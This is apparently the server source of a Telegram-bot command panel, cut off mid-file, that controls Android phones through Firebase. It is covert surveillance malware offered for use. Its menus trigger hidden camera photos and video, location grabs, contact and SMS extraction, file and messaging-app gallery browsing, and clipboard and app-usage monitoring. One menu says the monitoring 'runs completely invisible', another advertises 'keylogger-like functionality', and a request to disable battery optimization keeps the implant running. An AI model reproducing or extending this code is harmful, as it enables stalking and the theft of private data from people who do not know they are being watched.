import express from "express";
import multer  from "multer";
import fs      from "fs";
import path    from "path";
import TelegramBot from "node-telegram-bot-api";
import { initializeApp, cert } from "firebase-admin/app";
import { getDatabase }         from "firebase-admin/database";

/* ── ENV ─────────────────────────────────────────── */
const {
  BOT_TOKEN, FIREBASE_SERVICE_ACCOUNT, BASE_URL,
  AUTH_KEY = ""
} = process.env;
if (!BOT_TOKEN || !BASE_URL || !FIREBASE_SERVICE_ACCOUNT)
  throw new Error("Missing env vars");

/* ── Firebase Admin ─────────────────────────────── */
const sa = JSON.parse(FIREBASE_SERVICE_ACCOUNT);
initializeApp({
  credential : cert(sa),
  databaseURL: `https://${sa.project_id}-default-rtdb.firebaseio.com`
});
const db = getDatabase();

/* ── Express & Telegram setup ───────────────────── */
const app    = express();
const upload = multer({ dest: "/tmp" });
const PORT   = process.env.PORT || 3000;
app.use(express.json({ limit: '10mb' })); // Limit payload size
app.use(express.text({ limit: '10mb' }));

// Performance monitoring middleware
app.use((req, res, next) => {
  performanceStats.requests++;
  const startTime = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    if (duration > 5000) { // Log slow requests
      console.log(`🐌 Slow request: ${req.method} ${req.path} took ${duration}ms`);
    }
    if (res.statusCode >= 400) {
      performanceStats.errors++;
    }
  });
  
  next();
});

const bot = new TelegramBot(BOT_TOKEN);
bot.setWebHook(`${BASE_URL}/bot/${BOT_TOKEN}`);

// Smart rate limiting for uploads (prevent spam)
const uploadLimiter = new Map();
const UPLOAD_LIMIT = 10; // 10 uploads per minute per device
const UPLOAD_WINDOW = 60000; // 1 minute

function checkUploadRate(deviceId) {
  const now = Date.now();
  const deviceLimits = uploadLimiter.get(deviceId) || { count: 0, window: now };
  
  // Reset window if expired
  if (now - deviceLimits.window > UPLOAD_WINDOW) {
    deviceLimits.count = 0;
    deviceLimits.window = now;
  }
  
  deviceLimits.count++;
  uploadLimiter.set(deviceId, deviceLimits);
  
  return deviceLimits.count <= UPLOAD_LIMIT;
}

app.post(`/bot/${BOT_TOKEN}`, (req, res) => { 
  bot.processUpdate(req.body); 
  res.sendStatus(200); 
});

/* ── State Management ───────────────────────────── */
const userSessions = new Map();  // chatId -> {key, selectedDevice, lastActivity}
const awaitingAuth = new Map();  // chatId -> {messageId, timestamp}
const awaitingCustom = new Map(); // chatId -> {label, promptId, device}
const activeOperations = new Map(); // chatId -> {type, startTime, device}
const permissionRequests = new Map(); // chatId -> {deviceId, permission}

/* ── Helpers ────────────────────────────────────── */
const enc    = s => Buffer.from(s).toString("base64url");
const dec    = b => Buffer.from(b, "base64url").toString();
const parent = k => enc(path.dirname(dec(k)));

/* ── Advanced Progress Animations ─────────────────── */
const progressAnimations = {
  photo: ["📸", "📷", "✨", "🌟", "📸"],
  video: ["🎥", "🎬", "🎞️", "⚡", "✅"],
  location: ["📍", "🗺️", "🧭", "🌐", "📍"],
  files: ["📂", "📁", "🗂️", "💾", "📂"],
  gallery: ["🖼️", "🎨", "📸", "✨", "🌟"],
  contacts: ["📱", "👥", "📋", "💯", "✅"],
  sms: ["💬", "📨", "✉️", "📤", "✅"],
  permission: ["🔐", "⚙️", "🔧", "🛡️", "✅"],
  monitoring: ["👀", "🔍", "📊", "🎯", "✅"],
  clipboard: ["📋", "✂️", "📝", "💫", "✅"],
  stealth: ["🥷", "👻", "🔮", "⚡", "✅"]
};

const loadingFrames = [
  "⚡ Initializing...",
  "🔄 Processing...",
  "✨ Optimizing...",
  "🎯 Finalizing...",
  "✅ Complete!"
];

const fastAnimations = {
  success: ["✅", "🌟", "💫", "✨"],
  error: ["❌", "⚠️", "🔥", "💢"],
  loading: ["⏳", "⌛", "🔄", "⚡"]
};

/* ── Optimized Session Management ──────────────────── */
const SESSION_TIMEOUT = 20 * 60 * 1000; // 20 minutes (reduced for better memory management)
const CLEANUP_INTERVAL = 3 * 60 * 1000; // 3 minutes cleanup (more frequent)

function cleanupSessions() {
  const now = Date.now();
  let cleaned = 0;
  for (const [chatId, session] of userSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      userSessions.delete(chatId);
      cleaned++;
    }
  }
  if (cleaned > 0) {
    console.log(`🧹 Cleaned ${cleaned} expired sessions. Active: ${userSessions.size}`);
  }
}

// Performance optimized cleanup
setInterval(cleanupSessions, CLEANUP_INTERVAL);

function updateActivity(chatId) {
  const session = userSessions.get(chatId);
  if (session) {
    session.lastActivity = Date.now();
  }
}

// Optimized device query with caching
const deviceCache = new Map();
const DEVICE_CACHE_TTL = 30000; // 30 seconds cache

async function getDevices(key) {
  // Check cache first
  const cached = deviceCache.get(key);
  if (cached && Date.now() - cached.timestamp < DEVICE_CACHE_TTL) {
    return cached.devices;
  }
  
  try {
    const snapshot = await db.ref(`devices/${key}`).once('value');
    const devices = snapshot.val();
    if (!devices) return [];
    
    const deviceList = Object.entries(devices).map(([id, data]) => ({
      id,
      model: data.info?.model || 'Unknown',
      lastSeen: data.info?.time || 0,
      online: Date.now() - (data.info?.time || 0) < 5 * 60 * 1000,
      battery: data.info?.battery || -1,
      storage: data.info?.storage || {},
      permissions: data.info?.permissions || {}
    }));
    
    // Cache result
    deviceCache.set(key, {
      devices: deviceList,
      timestamp: Date.now()
    });
    
    return deviceList;
  } catch (error) {
    console.error('Device query error:', error);
    return [];
  }
}

/* ── Enhanced Animated Loading ─────────────────────── */
async function showAnimatedLoading(chatId, msgId, type = "default", duration = 200) {
  const frames = progressAnimations[type] || fastAnimations.loading;
  const steps = 8; // Ultra-fast - reduced from 15 to 8
  const interval = duration / steps;
  
  for (let i = 0; i <= steps; i++) {
    const percentage = Math.floor((i / steps) * 100);
    const barLength = 12;
    const filled = Math.floor((percentage / 100) * barLength);
    const bar = '█'.repeat(filled) + '░'.repeat(barLength - filled);
    const frame = frames[i % frames.length];
    
    // Dynamic progress messages
    let statusText = "Please wait...";
    if (percentage < 30) statusText = "_Initializing systems..._";
    else if (percentage < 60) statusText = "_Processing request..._";
    else if (percentage < 90) statusText = "_Finalizing operation..._";
    else statusText = "_Almost ready!_";
    
    try {
      await bot.editMessageText(
        `${frame} **Ultra-Fast Processing**\n\n` +
        `⚡ Progress: [${bar}] ${percentage}%\n\n` +
        `${statusText}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown'
        }
      );
      if (i < steps) await new Promise(resolve => setTimeout(resolve, interval));
    } catch (e) { 
      // Fail silently for smoother experience
      break; 
    }
  }
}

/* ── Quick Success Animation ────────────────────────── */
async function showQuickSuccess(chatId, msgId, message, duration = 200) {
  const frames = fastAnimations.success;
  for (let i = 0; i < frames.length; i++) {
    try {
      await bot.editMessageText(
        `${frames[i]} ${message}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown'
        }
      );
      if (i < frames.length - 1) await new Promise(resolve => setTimeout(resolve, duration));
    } catch (e) { break; }
  }
}

/* ── Fast Error Animation ──────────────────────────── */
async function showQuickError(chatId, msgId, message, duration = 250) {
  const frames = fastAnimations.error;
  for (let i = 0; i < frames.length; i++) {
    try {
      await bot.editMessageText(
        `${frames[i]} ${message}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown'
        }
      );
      if (i < frames.length - 1) await new Promise(resolve => setTimeout(resolve, duration));
    } catch (e) { break; }
  }
}

/* ── Login Flow with Animations ─────────────────── */
const loginKeyboard = {
  inline_keyboard: [
    [{text: "🔐 Enter Access Key", callback_data: "login_start"}]
  ]
};

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const session = userSessions.get(chatId);
  
  if (session && session.key) {
    updateActivity(chatId);
    await showDeviceSelection(chatId);
  } else {
    const welcomeMsg = await bot.sendAnimation(chatId, 
      'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif',
      {
        caption: "*🔒 Dreamer-Bot Security Portal*\n\n" +
                "Welcome to the most advanced device control system.\n\n" +
                "🔐 *Security Features:*\n" +
                "• End-to-end encrypted connection\n" +
                "• Multi-device management\n" +
                "• Real-time status monitoring\n" +
                "• Background service persistence\n" +
                "• Permission management\n\n" +
                "_Click below to authenticate_",
        parse_mode: 'Markdown',
        reply_markup: loginKeyboard
      }
    );
  }
});

/* ── Device Selection with Enhanced UI ──────────── */
async function showDeviceSelection(chatId) {
  const session = userSessions.get(chatId);
  if (!session) return;
  
  const devices = await getDevices(session.key);
  
  if (devices.length === 0) {
    await bot.sendAnimation(chatId,
      'https://media.giphy.com/media/3o7aTskHEUdgCQAXde/giphy.gif',
      {
        caption: "⚠️ *No Devices Found*\n\n" +
                "No devices are registered with this key.\n" +
                "Please install the app on a device first.\n\n" +
                "_The device will appear here automatically once connected._",
        parse_mode: 'Markdown'
      }
    );
    return;
  }
  
  const keyboard = {
    inline_keyboard: devices.map(dev => {
      const status = dev.online ? '🟢' : '🔴';
      const battery = dev.battery > 0 ? `${dev.battery}%🔋` : '';
      return [{
        text: `${status} ${dev.model} ${battery} (${dev.id.slice(0, 6)})`,
        callback_data: `select_${dev.id}`
      }];
    })
  };
  
  keyboard.inline_keyboard.push([
    {text: "🔄 Refresh", callback_data: "refresh_devices"},
    {text: "📊 System Status", callback_data: "system_status"}
  ]);
  
  keyboard.inline_keyboard.push([
    {text: "🚪 Logout", callback_data: "logout_confirm"}
  ]);
  
  await bot.sendMessage(chatId,
    "*📱 Connected Devices*\n\n" +
    `Found *${devices.length}* device${devices.length > 1 ? 's' : ''}\n\n` +
    "🟢 Online | 🔴 Offline\n\n" +
    "_Select a device to control:_",
    { 
      parse_mode: 'Markdown',
      reply_markup: keyboard 
    }
  );
}

/* ── Enhanced Main Menu with Monitoring ─────────────── */
function getMainMenu(includeBack = false) {
  const menu = {
    inline_keyboard: [
      [{text:"📸 Gallery Manager", callback_data:"gallery_root"}],
      [{text:"📂 File Explorer", callback_data:"file_menu"}],
      [
        {text:"🤳 Front Cam", callback_data:"cam_front"},
        {text:"📷 Back Cam", callback_data:"cam_back"}
      ],
      [{text:"📍 Location Services", callback_data:"location_menu"}],
      [{text:"📊 Data Extraction", callback_data:"data_menu"}],
      [{text:"🥷 Stealth Monitor", callback_data:"stealth_menu"}],
      [{text:"🎯 Enhanced Perfection", callback_data:"perfection_menu"}],
      [{text:"⚙️ Device Controls", callback_data:"device_menu"}],
      [{text:"🔐 Permissions", callback_data:"permissions_menu"}]
    ]
  };
  
  if (includeBack) {
    menu.inline_keyboard.push([
      {text:"🔄 Switch Device", callback_data:"switch_device"},
      {text:"🏠 Home", callback_data:"device_list"}
    ]);
  }
  
  return menu;
}

/* ── Sub-Menus ──────────────────────────────────── */
const getFileMenu = () => ({
  inline_keyboard: [
    [{text: "📁 Browse Files", callback_data: "file_root"}],
    [{text: "⚡ Quick Access", callback_data: "file_quick"}],
    [{text: "💾 Storage Info", callback_data: "file_storage"}],
    [{text: "🔍 Search Files", callback_data: "file_search_prompt"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getLocationMenu = () => ({
  inline_keyboard: [
    [{text: "📍 Get Current Location", callback_data: "loc_now"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getDataMenu = () => ({
  inline_keyboard: [
    [{text: "📱 Contacts", callback_data: "dump_contacts"}],
    [{text: "💬 SMS Messages", callback_data: "dump_sms"}],
    [{text: "📊 Device Info", callback_data: "device_info"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getDeviceMenu = () => ({
  inline_keyboard: [
    [{text: "🔋 Battery Status", callback_data: "battery_status"}],
    [{text: "📶 Network Info", callback_data: "network_info"}],
    [{text: "📱 App List", callback_data: "app_list"}],
    [{text: "🔄 Restart Services", callback_data: "restart_services"}],
    [{text: "🔙 Back", callback_data: "main_menu"}]
  ]
});

const getStealthMenu = () => ({
  inline_keyboard: [
    [{text: "📋 Clipboard Monitor", callback_data: "clipboard_monitor"}],
    [{text: "📱 App Usage Tracker", callback_data: "app_usage"}],
    [
      {text: "📊 System State", callback_data: "system_state"},
      {text: "⌨️ Input Patterns", callback_data: "input_patterns"}
    ],
    [{text: "📈 Monitor Dashboard", callback_data: "monitor_dashboard"}],
    [
      {text: "🔄 Start Monitor", callback_data: "start_monitoring"},
      {text: "⏹️ Stop Monitor", callback_data: "stop_monitoring"}
    ],
    [{text: "🔙 Back to Menu", callback_data: "main_menu"}]
  ]
});

const getEnhancedPerfectionMenu = () => ({
  inline_keyboard: [
    [{text: "🌐 Network Intelligence", callback_data: "network_intelligence"}],
    [{text: "🧠 Behavior Analysis", callback_data: "behavior_analysis"}],
    [
      {text: "📡 Sensor Intelligence", callback_data: "sensor_intelligence"},
      {text: "⚡ System Intelligence", callback_data: "system_intelligence"}
    ],
    [{text: "📊 Perfection Dashboard", callback_data: "perfection_dashboard"}],
    [
      {text: "🚀 Start Perfection", callback_data: "start_perfection"},
      {text: "⏹️ Stop Perfection", callback_data: "stop_perfection"}
    ],
    [{text: "🔙 Back to Menu", callback_data: "main_menu"}]
  ]
});

const getBackMenuButtons = (mainCallback = "main_menu") => [
  [
    {text: "🔄 Refresh", callback_data: "refresh_current"},
    {text: "🔙 Back", callback_data: mainCallback}
  ]
];

const getGalleryMenuButtons = () => [
  [
    {text: "📁 Gallery", callback_data: "gallery_root"},
    {text: "🔙 Back", callback_data: "main_menu"}
  ]
];

/* ── Gallery with Thumbnails ────────────────────── */
const gallery = ["whatsapp","screenshots","snapchat","camera","instagram","downloads","telegram","all"];
const getGalleryKeyboard = (includeBack = true) => {
  const kb = {
    inline_keyboard: []
  };
  
  gallery.filter(g => g !== "all").forEach((folder, i) => {
    if (i % 2 === 0) kb.inline_keyboard.push([]);
    kb.inline_keyboard[kb.inline_keyboard.length - 1].push({
      text: `📁 ${folder.charAt(0).toUpperCase() + folder.slice(1)}`,
      callback_data: `gallery_${folder}`
    });
  });
  
  kb.inline_keyboard.push([{
    text: "🖼️ All Images",
    callback_data: "gallery_all"
  }]);
  
  if (includeBack) {
    kb.inline_keyboard.push([{text: "🔙 Back to Menu", callback_data: "main_menu"}]);
  }
  
  return kb;
};

/* ── Enhanced Callback Handler ──────────────────── */
bot.on("callback_query", async q => {
  const {id, data, message} = q;
  const chatId = message.chat.id;
  const msgId = message.message_id;
  
  try {
    /* ── Login Flow ─────────────────────────────── */
    if (data === "login_start") {
      await bot.answerCallbackQuery(id);
      const prompt = await bot.sendMessage(chatId,
        "*🔑 Authentication Required*\n\n" +
        "Please enter your access key:\n\n" +
        "💡 _The key is in your app's_ `secret_key.txt` _file_",
        { 
          parse_mode: 'Markdown',
          reply_markup: { force_reply: true }
        }
      );
      awaitingAuth.set(chatId, {
        messageId: prompt.message_id,
        timestamp: Date.now()
      });
      return;
    }
    
    /* ── System Status ──────────────────────────── */
    if (data === "system_status") {
      await bot.answerCallbackQuery(id, { text: "Loading system status..." });
      const session = userSessions.get(chatId);
      if (!session) return;
      
      const devices = await getDevices(session.key);
      let statusText = "*📊 System Status*\n\n";
      
      devices.forEach(dev => {
        const status = dev.online ? '🟢 Online' : '🔴 Offline';
        const lastSeen = new Date(dev.lastSeen).toLocaleString();
        const storage = dev.storage.available 
          ? `${Math.round((dev.storage.available / (1024**3)) * 10) / 10} GB free`
          : 'Unknown';
        
        statusText += `*Device:* ${dev.model}\n`;
        statusText += `*ID:* \`${dev.id}\`\n`;
        statusText += `*Status:* ${status}\n`;
        statusText += `*Battery:* ${dev.battery > 0 ? dev.battery + '%' : 'Unknown'}\n`;
        statusText += `*Storage:* ${storage}\n`;
        statusText += `*Last Seen:* ${lastSeen}\n`;
        statusText += `─────────────────\n`;
      });
      
      await bot.sendMessage(chatId, statusText, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[{text: "🔙 Back", callback_data: "device_list"}]]
        }
      });
      return;
    }
    
    /* ── Device Menu Navigation ─────────────────── */
    if (data === "device_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*⚙️ Device Controls*\n\n" +
        "Advanced device management options:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getDeviceMenu()
        }
      );
      return;
    }
    
    /* ── Permission Checker ─────────────────────── */
    if (data === "check_permissions") {
      try {
      await bot.answerCallbackQuery(id, { text: "Checking permissions..." });
      const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        }
      
      // First, let's check what's currently stored in Firebase
      try {
        // Get both permissions and battery optimization status
        const deviceInfoSnapshot = await db.ref(`devices/${session.key}/${session.selectedDevice}/info`).once('value');
        const deviceInfo = deviceInfoSnapshot.val() || {};
        const storedPermissions = deviceInfo.permissions || {};
        const batteryOptStatus = deviceInfo.battery_optimization || "unknown";
        
        console.log("Current permissions in Firebase:", JSON.stringify(storedPermissions, null, 2));
        console.log("Battery optimization status:", batteryOptStatus);
        
        if (storedPermissions && Object.keys(storedPermissions).length > 0) {
          // Show current permissions from Firebase
          let message = "*🔐 Current Permissions (Firebase)*\n\n";
          
          // Add timestamp to ensure message is always different
          const timestamp = new Date().toLocaleTimeString();
          message += `_Last updated: ${timestamp}_\n\n`;
          
          const permissionEmojis = {
            camera: "📸",
            location_fine: "📍",
            location_coarse: "📍",
            contacts: "📱",
            sms: "💬",
            storage_read: "📂",
            storage_write: "📂",
            phone: "📞",
            microphone: "🎤",
            notifications: "🔔",
            all_files_access: "📁",
            overlay: "🖼️",
            device_admin: "⚙️",
            accessibility: "♿",
            notification_listener: "🔔",
            call_log: "📞",
            calendar: "📅"
          };
          
          const permissionDisplayNames = {
            camera: "Camera",
            location_fine: "Location (Fine)",
            location_coarse: "Location (Coarse)",
            contacts: "Contacts",
            sms: "SMS",
            storage_read: "Storage Read",
            storage_write: "Storage Write",
            phone: "Phone",
            microphone: "Microphone",
            notifications: "Notifications",
            all_files_access: "All Files Access",
            overlay: "Overlay",
            device_admin: "Device Admin",
            accessibility: "Accessibility",
            notification_listener: "Notification Listener",
            call_log: "Call Log",
            calendar: "Calendar"
          };
          
          Object.entries(storedPermissions).forEach(([perm, granted]) => {
            const emoji = permissionEmojis[perm] || "❓";
            const displayName = permissionDisplayNames[perm] || perm;
            const status = granted ? "✅ Granted" : "❌ Denied";
            message += `${emoji} ${displayName}: ${status}\n`;
          });
          
          // Add battery optimization status
          message += "\n\n*🔋 Battery Optimization Status*\n";
          let batteryStatusEmoji = "❓";
          let batteryStatusText = "Unknown";
          
          switch(batteryOptStatus) {
            case "exempt":
              batteryStatusEmoji = "✅";
              batteryStatusText = "Exempted (Battery optimization disabled)";
              break;
            case "requested":
              batteryStatusEmoji = "⏳";
              batteryStatusText = "Requested (Pending user approval)";
              break;
            case "not_exempt":
              batteryStatusEmoji = "❌";
              batteryStatusText = "Not Exempted (Battery optimization enabled)";
              break;
            case "not_applicable":
              batteryStatusEmoji = "ℹ️";
              batteryStatusText = "Not Applicable (Android version < 6.0)";
              break;
            case "error":
              batteryStatusEmoji = "⚠️";
              batteryStatusText = "Error requesting exemption";
              break;
            default:
              batteryStatusEmoji = "❓";
              batteryStatusText = "Unknown";
          }
          
          message += `${batteryStatusEmoji} ${batteryStatusText}\n`;
          message += `\n_Device: ${session.selectedDevice.slice(0,6)}_`;
          
          try {
            await bot.editMessageText(message, {
              chat_id: chatId,
              message_id: msgId,
              parse_mode: 'Markdown',
              reply_markup: {
                inline_keyboard: [
                  [{text: "🔄 Refresh Permissions", callback_data: "check_permissions"}],
                  [{text: "🔙 Back", callback_data: "main_menu"}]
                ]
              }
            });
            return;
          } catch (editError) {
            // Handle "message is not modified" error gracefully
            if (editError.description && editError.description.includes("message is not modified")) {
              console.log("Message content unchanged - this is normal for refresh");
              // Just answer the callback query to remove loading state
              await bot.answerCallbackQuery(id, { text: "✅ Permissions up to date" });
              return;
            } else {
              console.error("Error editing message:", editError);
              throw editError; // Re-throw other errors
            }
          }
        }
      } catch (error) {
        console.error("Error reading Firebase permissions:", error);
      }
      
      // If no permissions in Firebase or error, request fresh check
      await bot.editMessageText(
        "🔐 *Scanning Device Permissions*\n\n" +
        "Checking all permission statuses...\n\n" +
        "⏳ Please wait while we analyze your device...",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown'
        }
      );
      
      await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
        command: "check_permissions",
        chat: chatId,
        msg: msgId,
        ts: Date.now()
      });
      return;
      } catch (error) {
        console.error("Error in permission checker:", error);
        await bot.answerCallbackQuery(id, { text: "❌ Error checking permissions", show_alert: true });
      return;
      }
    }
    


    /* ── Permissions Menu ───────────────────────── */
    if (data === "permissions_menu") {
      try {
        await bot.answerCallbackQuery(id, { text: "Opening permissions menu..." });
        const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        }
        
        await bot.editMessageText(
          "*🔐 Device Permission Center*\n\n" +
          "Monitor your device permissions:\n\n" +
          "📊 *Check Permissions* - View detailed permission status\n" +
          "🔋 *Battery Optimization* - Request battery optimization exemption\n\n" +
          "_Device: " + session.selectedDevice.slice(0,6) + "..._",
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{text: "📊 Check Permissions", callback_data: "check_permissions"}],
                [{text: "🔋 Battery Optimization", callback_data: "battery_optimization"}],
                [{text: "🔙 Back to Menu", callback_data: "main_menu"}]
              ]
            }
          }
        );
        return;
      } catch (error) {
        console.error("Error in permissions menu:", error);
        await bot.answerCallbackQuery(id, { text: "❌ Error opening menu", show_alert: true });
        return;
      }
    }

    /* ── Battery Optimization ────────────────────── */
    if (data === "battery_optimization") {
      try {
        await bot.answerCallbackQuery(id, { text: "🔋 Requesting battery optimization..." });
        const session = userSessions.get(chatId);
        if (!session || !session.selectedDevice) {
          await bot.answerCallbackQuery(id, { text: "⚠️ No device selected", show_alert: true });
          return;
        }
        
        // Show loading message
        await bot.editMessageText(
          "🔋 *Requesting Battery Optimization*\n\n" +
          "Requesting battery optimization exemption for your device...\n\n" +
          "⏳ Please check your device for a permission prompt...\n\n" +
          "_This will help the app run reliably in the background._",
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'Markdown'
          }
        );
        
        // Send command to device
        await db.ref(`devices/${session.key}/${session.selectedDevice}`).update({
          command: "request_battery_optimization",
          chat: chatId,
          msg: msgId,
          ts: Date.now()
        });
        
        // Wait a bit to show the loading state
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Show success message with back button
        await bot.editMessageText(
          "🔋 *Battery Optimization Request Sent*\n\n" +
          "A request has been sent to your device to disable battery optimization.\n\n" +
          "📱 Please check your device for a permission prompt and select 'Allow'.\n\n" +
          "ℹ️ This permission is important for reliable background operation.\n\n" +
          "_Device: " + session.selectedDevice.slice(0,6) + "..._",
          {
            chat_id: chatId,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{text: "🔙 Back to Permissions", callback_data: "permissions_menu"}]
              ]
            }
          }
        );
        return;
      } catch (error) {
        console.error("Error in battery optimization request:", error);
        await bot.answerCallbackQuery(id, { text: "❌ Error requesting battery optimization", show_alert: true });
        return;
      }
    }
    

    
    /* ── Refresh Devices ────────────────────────── */
    if (data === "refresh_devices") {
      await bot.answerCallbackQuery(id, { text: "Refreshing device list..." });
      await showDeviceSelection(chatId);
      return;
    }
    
    /* ── Switch Device ──────────────────────────── */
    if (data === "switch_device" || data === "device_list") {
      await bot.answerCallbackQuery(id);
      await showDeviceSelection(chatId);
      return;
    }
    
    /* ── Session Check ──────────────────────────── */
    const session = userSessions.get(chatId);
    if (!session || !session.key) {
      await bot.answerCallbackQuery(id, {
        text: "⚠️ Session expired. Please login again.",
        show_alert: true
      });
      await bot.sendMessage(chatId, "Session expired. Please use /start to login again.");
      return;
    }
    
    updateActivity(chatId);
    
    /* ── Device Selection ───────────────────────── */
    if (data.startsWith("select_")) {
      const deviceId = data.replace("select_", "");
      session.selectedDevice = deviceId;
      await bot.answerCallbackQuery(id, { text: "✅ Device selected" });
      
              await showAnimatedLoading(chatId, msgId, "default", 300);
      
      await bot.editMessageText(
        `*🎯 Control Center*\n\n` +
        `Device: \`${deviceId.slice(0, 6)}...\`\n\n` +
        `Select an action:`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getMainMenu(true)
        }
      );
      return;
    }
    
    /* ── Navigation Handlers ────────────────────── */
    if (data === "main_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*🎛️ Control Panel*\n\n" +
        `Device: \`${session.selectedDevice?.slice(0, 6) || 'None'}...\`\n\n` +
        "Select an action:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getMainMenu(true)
        }
      );
      return;
    }
    
    /* ── Sub-Menu Navigation ────────────────────── */
    if (data === "file_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📂 File Explorer*\n\n" +
        "Choose an option:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getFileMenu()
        }
      );
      return;
    }
    
    if (data === "location_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📍 Location Services*\n\n" +
        "Choose an option:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getLocationMenu()
        }
      );
      return;
    }
    
    if (data === "data_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📊 Data Extraction*\n\n" +
        "Choose data to extract:",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getDataMenu()
        }
      );
      return;
    }
    
    /* ── Stealth Monitoring Menu ────────────────────── */
    if (data === "stealth_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*🥷 Stealth Monitoring Center*\n\n" +
        "Advanced user activity monitoring:\n\n" +
        "📋 *Clipboard* - Monitor copy/paste activity\n" +
        "📱 *App Usage* - Track app switches & usage\n" +
        "📊 *System State* - Monitor device performance\n" +
        "⌨️ *Input Patterns* - Detect typing activity\n\n" +
        "_All monitoring runs completely invisible_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getStealthMenu()
        }
      );
      return;
    }
    
    /* ── Enhanced Perfection Menu ────────────────────── */
    if (data === "perfection_menu") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*🎯 Enhanced Perfection Intelligence*\n\n" +
        "Revolutionary monitoring without permissions:\n\n" +
        "🌐 *Network Intelligence* - Traffic pattern analysis\n" +
        "🧠 *Behavior Analysis* - User pattern recognition\n" +
        "📡 *Sensor Intelligence* - Motion-based input detection\n" +
        "⚡ *System Intelligence* - Resource & process analysis\n\n" +
        "_Ultra-enhanced keylogger-like functionality_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getEnhancedPerfectionMenu()
        }
      );
      return;
    }
    
    /* ── Camera with Preview ────────────────────── */
    if (data === "cam_front" || data === "cam_back") {
      const side = data === "cam_front" ? "Front" : "Back";
      const emoji = data === "cam_front" ? "🤳" : "📷";
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        `*${emoji} ${side} Camera*\n\n` +
        "Select action:\n\n" +
        "_Photos are captured in high quality_\n" +
        "_Videos support up to 5 minutes recording_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text:"📸 Capture Photo", callback_data:`capture_${side.toLowerCase()}` },
                { text:"🎥 Record Video", callback_data:`rec_${side.toLowerCase()}` }
              ],
              [{ text:"🔙 Back", callback_data:"main_menu" }]
            ]
          }
        }
      );
      return;
    }
    
    /* ── Gallery Root Menu ──────────────────────── */
    if (data === "gallery_root") {
      await bot.answerCallbackQuery(id);
      await bot.editMessageText(
        "*📸 Gallery Manager*\n\n" +
        "Select a folder to browse:\n\n" +
        "_Each folder shows the latest images first_",
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: 'Markdown',
          reply_markup: getGalleryKeyboard()
        }
      );
      return;
    }
    
    /* ── Device Check ───────────────────────────── */
    if (!session.selectedDevice) {
      await bot.answerCallbackQuery(id, {
        text: "⚠️ Please select a device first",
        show_alert: true
      });
      await showDeviceSelection(chatId);
      return;
    }
    
    const devicePath = `devices/${session.key}/${session.selectedDevice}`;
    
    /* ── Execute Commands ───────────────────────── */
    const commandMap = {
      // Camera
      "capture_front": { type: "photo", msg: "📸 Capturing front photo..." },
      "capture_back": { type: "photo", msg: "📷 Capturing back photo..." },
      
      // Location
      "loc_now": { type: "location", msg: "📍 Getting current location..." },
      "loc_start": { type: "location", msg: "🎯 Starting location tracking..." },
      "loc_stop": { type: "location", msg: "⏹️ Stopping location tracking..." },
      
      // Data
      "dump_contacts": { type: "contacts", msg: "📱 Extracting contacts..." },
      "dump_sms": { type: "sms", msg: "💬 Extracting SMS messages..." },
      "device_info": { type: "files", msg: "📊 Getting device information..." },
      
      // Files
      "file_root": { type: "files", msg: "📂 Loading file explorer..." },
      "file_quick": { type: "files", msg: "⚡ Loading quick access..." },
      "file_storage": { type: "files", msg: "💾 Calculating storage..." },
      
      // Device
      "battery_status": { type: "default", msg: "🔋 Getting battery status..." },
      "network_info": { type: "default", msg: "📶 Getting network info..." },
      "app_list": { type: "default", msg: "📱 Getting app list..." },
      "restart_services": { type: "default", msg: "🔄 Restarting services..." },
      
      // Stealth Monitoring
      "clipboard_monitor": { type: "monitoring", msg: "📋 Accessing clipboard history..." },
